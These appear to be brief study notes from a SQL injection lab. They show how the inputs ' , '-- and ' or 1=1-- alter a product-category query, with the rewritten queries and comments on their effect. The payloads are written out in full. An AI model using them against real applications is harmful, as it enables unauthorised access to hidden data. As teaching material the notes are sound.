SELECT * FROM products WHERE category = ''' AND released = 1 

'-- Gives us nothing back, ' becomes the second ' and the rest gets commented out
SELECT * FROM products WHERE category = ''--' AND released = 1 
SELECT * FROM products WHERE category = ''

' or 1=1-- Performs injection, ' becomes the second ' or 1=1 and the rest gets commented out
SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1 
SELECT * FROM products WHERE category = '' or 1=1
